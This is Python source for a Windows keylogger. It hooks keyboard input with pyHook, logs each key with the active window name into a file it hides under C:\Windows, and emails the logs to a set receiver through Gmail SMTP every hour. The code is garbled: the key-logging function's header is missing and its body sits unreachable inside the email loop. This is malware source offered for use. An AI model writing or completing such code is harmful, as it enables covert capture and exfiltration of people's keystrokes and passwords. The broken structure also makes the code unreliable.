import datetime
import os
import smtplib
import subprocess
import threading
import time
import win32gui
import pyHook
import pythoncom


EMAIL_ADDRESS = "your@email.com"
EMAIL_PASSWORD = "yourpassword"

EMAIL_RECEIVER = "receiver@email.com"

LOG_DIRECTORY = "C:\\Windows\\PyKHandler"

LOG_FILENAME = os.path.join(LOG_DIRECTORY, "keys.txt")

# MINUTES!
EMAIL_FREQUENCY = 60

running = True


def send_email(subject, message, to):
    with smtplib.SMTP("smtp.gmail.com", 587) as server:
        server.ehlo()
        server.starttls()
        server.ehlo()

        server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)

        msg = f"Subject: {subject}\n\n{message}"
        server.sendmail(EMAIL_ADDRESS, to, msg)


def send_logs():
    with open(LOG_FILENAME, "r") as f:
        logs = f.read()

    send_email("Keylogger logs", logs, EMAIL_RECEIVER)

    # Czyścimy plik z logami po wysłaniu
    with open(LOG_FILENAME, "w") as f:
        f.write("")


def schedule_emails():
    while running:
        send_logs()
        time.sleep(EMAIL_FREQUENCY * 60)


    current_window_title = get_current_window_title()

    log = f"{event.WindowName} - {current_window_title} - {event.Key}\n"

    with open(LOG_FILENAME, "a") as f:
        f.write(log)

    return True


def hide_file(filepath):
    subprocess.call(f'attrib +h "{filepath}"', shell=True)


def start_keylogger():

    os.makedirs(LOG_DIRECTORY, exist_ok=True)

    hide_file(LOG_FILENAME)

    email_thread = threading.Thread(target=schedule_emails)
    email_thread.start()

    hook = pyHook.HookManager()
    hook.KeyDown = log_key
    hook.HookKeyboard()

    pythoncom.PumpMessages()


if __name__ == "__main__":
    start_keylogger()
